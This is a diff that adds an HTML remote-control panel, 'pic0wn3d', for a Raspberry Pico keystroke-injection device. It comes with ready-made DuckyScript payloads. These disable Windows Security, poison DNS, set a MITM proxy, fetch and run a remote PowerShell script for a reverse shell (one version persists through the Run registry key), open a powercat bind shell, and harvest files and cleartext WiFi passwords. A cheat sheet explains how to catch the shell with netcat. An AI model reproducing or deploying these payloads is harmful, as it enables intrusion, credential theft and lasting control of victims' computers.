@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="description" content="pic0wn3d Remote Control">
+    <meta name="keywords" content="Raspberry Pico, WiFi Duck, picowned, Reverse Shell">
+    <meta name="author" content="#m0d3ls!, majdsassi">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pic0wn3d v1.0</title>
+   <style>
+       body {
+            font-family: "Aharoni", monospace;
+            background-color: #647169;        
+            transition: 0.5s;
+        } 
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        #canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+            background: black;
+        }
+        hr {
+          display:block;
+          height: 1px;
+          border:0;
+          border-top: 1px solid rgba(166, 176, 186, 0.4);;
+            margin-top: 25px;
+            margin-bottom: 25px;
+            width:100%;
+           box-shadow: 5px 5px 5px rgba(5, 8, 4, 1);
+        }
+        .infotext {
+            font-weight: bolder;
+            color:  #715bd4;
+            text-shadow: 2px 2px 4px rgba(5, 8, 4, 1);
+        }        
+        a, a:visited {
+            font-weight: bolder;
+            color: #715bd4;
+            text-decoration: none;
+            transition: 0.7s;
+        }
+        a:hover {
+            text-shadow: 2px 2px 4px rgba(5, 8, 4, 1);
+            color: #922b21;
+        }
+        header {
+            text-align: center;
+            letter-spacing: 4px;
+            transition: 0.3s;
+            font-size: 1.4rem;
+            padding: 15px;
+        }   
+        header pre {
+            background: -webkit-linear-gradient(#95c9aa, #715bd4);
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 0.666rem;
+            text-shadow: 6px 6px 2px rgba(5, 8, 4, 1);
+        }
+
+        .form {
+            text-align: center;
+            align-items: center;   
+        }
+
+        footer {
+            padding: 0;
+            margin-top: 15px;
+            display: flex;
+            flex-direction: row;
+            background-color: rgba(22, 25, 23, 0.4);
+            border-radius: 10px;
+            border: 4px solid #181c1a;
+            box-shadow: 0 0 20px rgba(26, 37, 21, 0.5);
+        }
+
+        #exploit_list {
+            display: flex;
+            flex-direction: column;
+            background-color: rgba(22, 25, 23, 0.7);
+            border-radius: 5px;
+            border: 4px solid #181c1a;
+            box-shadow: 0 0 10px rgba(26, 37, 21, 0.2);
+            letter-spacing: 1.5px;
+            padding: 0;
+            margin: 0;
+        }
+
+        #exploit_list li {
+            margin: auto;
+            width: 100%;
+            list-style-type: none;
+            padding: 18px;
+            border-top: 5px solid rgba(22, 25, 23, 0);
+            border-bottom: 5px solid rgba(22, 25, 23, 0);
+            transition: 0.5s;
+        }
+
+        #exploit_list  li:hover {
+            background-color: #283231;
+            border-bottom: 5px solid rgba(76, 118, 115, 0.8);
+            border-top: 5px solid rgba(76, 118, 115, 0.8);
+        }
+
+        links {
+
+   align-items: stretch;
+            font-size: 1.2rem;
+            display: flex;
+            justify-content: center;
+            text-align: center;
+        }
+        linkblock {
+            justify-content: center;
+
+            display: flex;
+            margin: 0;
+            flex-direction: row;
+            padding: 10px;
+        }
+        linkblock h3 {
+            background-color: rgba(22, 25, 23, 1);
+            border-bottom:4px solid #181c1a;
+            padding: 5px;
+            margin: 0 0 5px;
+        }
+
+        main {
+            backdrop-filter: blur(1.25px);
+            padding: 10px;
+            margin: 15px;
+            background-color: rgba(22, 25, 23, 0.7);
+            border: 4px solid #181c1a;
+            border-radius: 16px;
+            box-shadow: 0 0 50px rgba(26, 37, 21, 1);
+            font-size: 1rem;
+            color: #aab7b8;
+            transition: 0.5s;
+        }
+        textarea {
+            color: #bfbfbf;
+            min-width: 100%;
+            min-height: 400px;
+            padding: 8px;
+            margin: 0;
+            border: 4px solid #1a201d;
+            box-shadow: 0 0 5px rgba(22, 28, 24, 1), inset 0 0 10px rgba(166, 176, 186, 0.5);
+            border-radius: 6px;
+            background: #36393e;
+            font-family: "Lucida Console", monospace;      
+            resize: none;
+            scrollbar-color: #95c9aa #181c1a;
+}
+        button {
+            line-height: 30px;
+            width: 100px;
+            font-weight: bolder;
+            color: #bfbfbf;
+            box-sizing : content-box;
+            padding: 0 0 0 4px;
+            margin: 10px;
+            height: 30px;
+            background-color: #0a0b0a;
+            border: 4px solid #1a201d;
+            border-radius: 3px;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(22, 28, 24, 0.5);
+            transition: 0.7s;  
+}
+        button:hover {
+            letter-spacing: 2px;
+            text-align: center;
+            justify-content: center;
+            align-items: center;
+            color: #0f1a35;
+            width: 100px;
+            background-color: #aab7b8;
+            box-shadow: 0 0 10px rgba(22, 28, 24, 0.8);
+        }
+
+h1, h2, h3, h4 {
+    color: #95c9aa;
+    text-shadow: 2px 2px 3px #6d7a73;
+    margin: 4px;
+}
+h1 { font-size: 3.2rem; text-shadow: 3px 3px 1px #6d7a73; padding: 20px; }
+h2 { font-size: 2.5rem; text-shadow: 2px 2px 2px #6d7a73; padding: 20px; }
+h3, h4 { padding: 5px; }
+h3 { font-size: 1.8rem; }
+h4 { font-size: 1.3rem; }
+
+h4::before {
+    content: "☢ "; 
+     }
+
+        cheatsheet {
+            background-color: rgba(22, 25, 23, 0.5);
+            border-radius: 10px;
+            border: 2px solid #181c1a;
+            box-shadow: 0 0 20px rgba(26, 37, 21, 0.5);
+            display: flex;
+            flex-direction: column;
+            overflow: auto;
+            padding: 5px;
+            font-size: 0.8rem;
+            word-wrap: break-word;
+        }
+        cheatsheet b {
+            color: #d9cd50;
+            text-shadow: 2px 2px 4px rgba(5, 8, 4, 1);
+        }
+        block {
+            background: #36393e;
+            border-radius: 4px;
+            box-shadow: inset 0 0 10px rgba(166, 176, 186, 0.5);
+            padding: 15px;
+            margin: 5px;
+            text-wrap: pretty;
+            word-wrap: break-word;
+        }
+        bottomblock {
+            display: flex;
+            margin: auto;
+            padding: 0;
+            line-height: 30px;
+        }
+
+
+       @media screen and (max-width: 768px) {
+            footer, main, cheatsheet, button {
+                border: 4px solid #181c1a;
+            }
+            footer {
+                font-size: 0.7rem;
+            }
+            body {
+                font-size: 0.9rem;
+            }
+            wrapper {
+                display: flex;
+                flex-direction: column;
+                font-size: 0.7rem;
+                margin: 0;
+            }
+
+            button {
+                padding: 0 0 0 3px;
+                line-height: 25px;
+                margin: 5px;
+                font-size: 0.5rem;
+                width: 60px;
+                height: 25px;
+            }
+            button:hover {
+                padding: 0 0 0 3px;
+                font-size: 0.5rem;
+                width: 60px;
+                }
+            h1
+            {
+                font-size: 1.4rem;
+            }
+            h2 {
+                font-size: 1.4rem;
+            }
+            h3 {
+                font-size: 0.8rem;
+            }
+            h4 {
+                font-size: 0.7rem;
+            }
+            textarea {
+                height: 100px;
+            }
+            links {
+                display: flex;
+                flex-direction: column;
+      
+            }
+            linkblock {
+                display: flex;
+                flex-direction: column;
+                text-align: center;
+                justify-content: center;
+                
+
+            }
+            ul {
+                display: flex;
+                flex-direction: column;
+                text-align: center;
+                border-radius: 6px;
+            }
+            li {
+                border: 0;
+                width: 100%;
+                padding-top: 8px;
+                padding-bottom: 8px;
+            }
+            li:hover {
+                           width: 100%;
+                border:0;
+            }
+            bottomblock{
+                line-height: 10px;
+            }
+            header {
+                display: none;
+            }
+    }
+</style>
+</head>
+<body>
+     <canvas id="canvas"></canvas>
+     <script type="text/javascript">
+        var canvas = document.getElementById('canvas'),
+            ctx = canvas.getContext('2d'),
+            cw = window.innerWidth,
+            ch = window.innerHeight,
+            charArr = 'abcdefghijklmnopqrstuvwxyz123456789^._-アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン'.split(''),
+            maxColums = cw / 10,
+            fallingCharArr = [],
+            fontSize = 14;
+
+        canvas.width = cw;
+        canvas.height = ch;
+
+        function randomInt(min, max) {
+            return Math.floor(Math.random() * (max - min) + min);
+        }
+
+        function randomFloat(min, max) {
+            return Math.random() * (max - min) + min;
+        }
+
+        function Point(x, y) {
+            this.x = x;
+            this.y = y;
+            this.speed = randomFloat(2, 14);
+        }
+
+        Point.prototype.draw = function() {
+            this.value = charArr[randomInt(0, charArr.length)].toUpperCase();
+            ctx.fillStyle = "#22e663";
+            ctx.font = fontSize + "px monospace";
+            ctx.fillText(this.value, this.x, this.y);
+
+            this.y += this.speed;
+            if (this.y > ch) {
+                this.y = randomFloat(-100, 0);
+                this.speed = randomFloat(2, 14);
+            }
+        };
+
+        for (var i = 0; i < maxColums; i++) {
+            fallingCharArr.push(new Point(i * fontSize, randomFloat(-500, 0)));
+        }
+
+        function update() {
+            ctx.fillStyle = "rgba(0,0,0,0.1)";
+            ctx.fillRect(0, 0, cw, ch);
+
+            for (var i = 0; i < fallingCharArr.length; i++) {
+                fallingCharArr[i].draw();
+            }
+
+            setTimeout(update, 20);
+        }
+
+        update();
+
+        function sendHttpRequest(data) {
+       console.log(data);
+        var url = "http://192.168.4.1/api" ;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader("Content-Type", "application/json");     
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+              console.log("Request sent successfully!");
+            } else {
+              console.error("Request failed. Status:", xhr.status);
+            }
+          }
+        };
+      
+        xhr.send(JSON.stringify(data));
+      };
+      function main(){
+        var payload = document.getElementById("payload").value ;
+        var data = {username : "Payload" , content : payload} ;
+        sendHttpRequest(data) ;
+      }
+
+      function updateTextarea(text) {
+            document.getElementById("payload").value = text;
+        }
+
+function topFunction() {
+  document.body.scrollTop = 0;
+  document.documentElement.scrollTop = 0;
+}
+
+    </script>
+
+        <main>
+            <header>
+<pre>
+         d8b                                                       888 
+         Y8P                                                       888 
+                                                                   888 
+88888b.  888  .d8888b .d88b.  888  888  888 88888b.   .d88b.   .d88888 
+888 "88b 888 d88P"   d88""88b 888  888  888 888 "88b d8P  Y8b d88" 888 
+888  888 888 888     888  888 888  888  888 888  888 88888888 888  888 
+888 d88P 888 Y88b.   Y88..88P Y88b 888 d88P 888  888 Y8b.     Y88b 888 
+88888P"  888  "Y8888P "Y88P"   "Y8888888P"  888  888  "Y8888   "Y88888 
+888                                                                    
+888                                                                    
+888                                                                    
+</pre>
+<br><pre>You don't know the power of the DARKSIDE!</pre></header>
+            <links>
+                 <linkblock>
+                    <ul id="exploit_list">
+                        <h3>Misc</h3>
+                    <a href="#" onclick="updateTextarea('CTRL ESC\nDELAY 500\nSTRING windows security\nDELAY 500\nENTER\nDELAY 1000\nENTER\nTAB\nTAB\nTAB\nTAB\nENTER\nDELAY 100\nSPACE\nDELAY 500\nLEFT\nDELAY 500\nENTER\nDELAY 500\nTAB\nDELAY 500\nSPACE\nDELAY 500\nTAB\nDELAY 500\nSPACE\nDELAY 100\nALT F4')"><li>Disable Windows Security</li></a>
+                    <a href="#" onclick="updateTextarea('GUI r\nDELAY 500\nSTRING notepad\nDELAY 500\nENTER\nDELAY 500\nGUI UPARROW\nDELAY 500\nSTRING RICK ROLL NOTEPADZZZ\nENTER')"><li>Notepad RickRoll</li></a>
+               <a href="#" onclick="updateTextarea('GUI r\nDELAY 50\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER\nDELAY 1500\nf')"><li>YouTube RickRoll</li></a>
+                    </ul>
+                </linkblock>
+                <linkblock>
+          <ul id="exploit_list">
+        <h3>PowerShell</h3>
+                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-DnsClientServerAddress -InterfaceAlias \'Ethernet\' -ServerAddresses (\'1.3.3.7\', \'1.2.3.4\')\nDELAY 100\nENTER\nDELAY 100\nSSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-DnsClientServerAddress -InterfaceAlias \'Wi-Fi\' -ServerAddresses (\'1.3.3.7\', \'1.2.3.4\')\nDELAY 100\nENTER')"><li>DNS Poison</li></a>
+                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' -Name ProxyServer \'1.3.3.7:666\'\nDELAY 100\nENTER\nDELAY 200\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' -Name ProxyEnable \'1\'\nDELAY 100\nENTER\n')"><li>MITM Proxy</li></a>
+                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile iex (New-Object Net.WebClient).DownloadString(&quot;http://yu0rs3rv3r.com/yeahbuddy.ps1&quot;)\nDELAY 100\nENTER')"><li>Reverse Shell</li></a>
+                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile iex (New-Object Net.WebClient).DownloadString(&quot;http://yu0rs3rv3r.com/yeahbuddy.ps1&quot;);New-ItemProperty -Path \'HKCU:Software\\Microsoft\\Windows\\CurrentVersion\Run\\\' -Name \'picowned\' -Value \'powershell -W hidden -ExecutionPolicy Bypass -NoProfile iex (New-Object Net.WebClient).DownloadString(&quot;http://yu0rs3rv3r.com/yeahbuddy.ps1&quot;)\' -PropertyType \'String\'\nDELAY 200\nENTER')"><li>Persistent Reverse Shell</li></a>
+                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile IEX (New-Object System.Net.Webclient).DownloadString(&quot;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&quot;);powercat -l -p 7777\nDELAY 300\nENTER')"><li>Bind Shell</li></a>
+            </ul>
+            </linkblock>
+            <linkblock>
+                <ul id="exploit_list">
+                    <h3>File harvesters</h3>
+                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile $SourceFile = \'C:\\FILE_TO_COPY\\readme.txt\'; $TargetDriveLabel = \'pic0wn3d\'; $Attempts = 0; $MaxAttempts = 10; while ($Attempts -lt $MaxAttempts) { $Drives = Get-Volume | Where-Object { $_.FileSystemLabel -eq $TargetDriveLabel }; if ($Drives) { $TargetPath = \'$($Drives.DriveLetter):\\\'; Copy-Item $SourceFile -Destination $TargetPath -Force; exit }; Start-Sleep -Seconds 1; $Attempts++ }\nDELAY 300\nENTER')"><li>File Copy</li></a>
+                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile $SourceFile = \'$env:TEMP\\wifi_passwords.txt\'; netsh wlan show profiles | Select-String \'All User Profile\' | ForEach-Object { ($_ -split \': \')[-1].Trim() } | ForEach-Object { $p=$_; $pw=netsh wlan show profile name=\'$p\' key=clear | Select-String \'Key Content\'; if ($pw) { \'Profile: $p, Password: \' + ($pw -split \': \')[-1].Trim() } else { \'Profile: $p, Password: Not found or not available.\' } } | Out-File -FilePath $SourceFile -Encoding UTF8; $TargetDriveLabel = \'pic0wn3d\'; $Attempts = 0; $MaxAttempts = 10; while ($Attempts -lt $MaxAttempts) { $Drives = Get-Volume | Where-Object { $_.FileSystemLabel -eq $TargetDriveLabel }; if ($Drives) { $TargetPath = \'$($Drives.DriveLetter):\\\'; Copy-Item $SourceFile -Destination $TargetPath -Force; exit }; Start-Sleep -Seconds 1; $Attempts++ }\nDELAY 300\nENTER')"><li>WiFi keys</li></a>
+                </ul>
+            </linkblock>
+        </links>
+    <div class="form">
+        <textarea id="payload" name="content" placeholder="...write your inputs here or load premade."></textarea>
+        <h3>picowned remote control <a class="reload" id="editorReload"></a><button onclick="main()" class="run">RUN</button></h3>
+        </div>
+                <cheatsheet>          
+<h4>Shell</h4>   <block>
+  To listen for the <span class="infotext">Reverse Shell</span>, you can use <b>nc -lvnp 1337</b> for example.<br>
+  When connection is established to the webpanel, the LED will stay solid.
+</block>
+            <h4>Usable Keys</h4>
+        <block>'WINDOWS': Keycode.WINDOWS, 'GUI': Keycode.GUI,
+    'APP': Keycode.APPLICATION, 'MENU': Keycode.APPLICATION, 'SHIFT': Keycode.SHIFT,
+    'ALT': Keycode.ALT, 'CONTROL': Keycode.CONTROL, 'CTRL': Keycode.CONTROL,
+    'DOWNARROW': Keycode.DOWN_ARROW, 'DOWN': Keycode.DOWN_ARROW, 'LEFTARROW': Keycode.LEFT_ARROW,
+    'LEFT': Keycode.LEFT_ARROW, 'RIGHTARROW': Keycode.RIGHT_ARROW, 'RIGHT': Keycode.RIGHT_ARROW,
+    'UPARROW': Keycode.UP_ARROW, 'UP': Keycode.UP_ARROW, 'BREAK': Keycode.PAUSE,
+    'PAUSE': Keycode.PAUSE, 'CAPSLOCK': Keycode.CAPS_LOCK, 'DELETE': Keycode.DELETE,
+    'END': Keycode.END, 'ESC': Keycode.ESCAPE, 'ESCAPE': Keycode.ESCAPE, 'HOME': Keycode.HOME,
+    'INSERT': Keycode.INSERT, 'NUMLOCK': Keycode.KEYPAD_NUMLOCK, 'PAGEUP': Keycode.PAGE_UP,
+    'PAGEDOWN': Keycode.PAGE_DOWN, 'PRINTSCREEN': Keycode.PRINT_SCREEN, 'ENTER': Keycode.ENTER,
+    'SCROLLLOCK': Keycode.SCROLL_LOCK, 'SPACE': Keycode.SPACE, 'TAB': Keycode.TAB,
+    'A': Keycode.A, 'B': Keycode.B, 'C': Keycode.C, 'D': Keycode.D, 'E': Keycode.E,
+    'F': Keycode.F, 'G': Keycode.G, 'H': Keycode.H, 'I': Keycode.I, 'J': Keycode.J,
+    'K': Keycode.K, 'L': Keycode.L, 'M': Keycode.M, 'N': Keycode.N, 'O': Keycode.O,
+    'P': Keycode.P, 'Q': Keycode.Q, 'R': Keycode.R, 'S': Keycode.S, 'T': Keycode.T,
+    'U': Keycode.U, 'V': Keycode.V, 'W': Keycode.W, 'X': Keycode.X, 'Y': Keycode.Y,
+    'Z': Keycode.Z, 'F1': Keycode.F1, 'F2': Keycode.F2, 'F3': Keycode.F3,
+    'F4': Keycode.F4, 'F5': Keycode.F5, 'F6': Keycode.F6, 'F7': Keycode.F7,
+    'F8': Keycode.F8, 'F9': Keycode.F9, 'F10': Keycode.F10, 'F11': Keycode.F11,
+    'F12': Keycode.F12</p><br></block>
+            </cheatsheet>
+        <footer><bottomblock><a href="irc://irc.se.quakenet.org/m0d3ls!" target="_blank">#m0d3ls!</a>&nbsp;&amp;&nbsp;<a href="https://en.wikipedia.org/wiki/Skynet_(Terminator)" target="_blank">Skynet</a>&nbsp;2025</bottomblock><bottomblock><a href="https://revshells.com" target="_blank">Reverse Shells generator</a></bottomblock><bottomblock><button onclick="topFunction()" id="topbtn" class="top">TOP</button></bottomblock></footer>
+    </main>
+
+</body>
+</html>
